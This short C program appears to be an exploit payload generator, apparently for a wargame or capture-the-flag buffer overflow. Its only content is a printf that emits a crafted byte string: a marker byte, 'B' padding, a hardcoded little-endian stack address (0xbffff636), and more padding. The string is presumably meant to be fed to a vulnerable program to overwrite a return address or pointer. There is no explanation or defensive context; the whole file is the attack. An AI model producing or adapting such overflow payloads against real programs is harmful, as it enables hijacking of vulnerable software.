#include <stdio.h>
#include <unistd.h>

int main()
{
		printf("\x80" \
				"BBBBBBBB" \
				"\x36\xf6\xff\xbf" \
				"BBBBBBBBBBBBBBBBBBBBBBBBBB" \
				"\n");
}
